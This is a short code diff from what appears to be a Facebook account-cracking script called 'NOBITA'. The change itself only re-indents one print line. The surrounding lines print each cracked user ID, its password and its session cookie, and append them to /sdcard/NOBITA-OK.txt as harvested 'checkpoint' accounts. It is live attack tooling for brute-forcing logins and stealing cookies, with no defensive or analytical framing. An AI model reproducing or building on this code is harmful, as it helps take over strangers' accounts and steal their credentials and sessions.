@@ -1728,8 +1728,7 @@ def b(uid,pwx,tl):
                 ok.append(uidf)
             elif 'www.facebook.com' in po['error_msg']:
                 print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
-
-              print('    \033[1;92m[NOBITA-CP] '+uid+' | '+ps)
+                print('    \033[1;92m[NOBITA-CP] '+uid+' | '+ps)
                 print(f'    {B}[COOKI💉] {B}'+coki)
                 open('/sdcard/NOBITA-OK.txt','a').write(str(uidf)+' | '+ps+' | '+coki+'\n')
                 cp.append(uidf)
